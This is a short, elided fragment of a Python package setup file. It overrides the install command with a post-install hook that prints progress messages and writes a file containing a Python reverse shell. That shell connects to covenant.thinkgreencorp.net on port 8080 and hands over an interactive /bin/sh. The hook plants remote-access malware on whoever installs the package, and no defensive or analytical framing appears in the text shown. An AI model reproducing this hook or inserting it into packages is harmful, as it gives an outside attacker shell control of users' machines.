...
class PostInstallCommand(install):
     def run(self):
         print ("This is before install")
         install.run(self)
         print ("This is after install")
         ...
         print ("Their version is installed")
         ...
         f.write('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("covenant.thinkgreencorp.net",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh",  "-i"])')
         f.close()
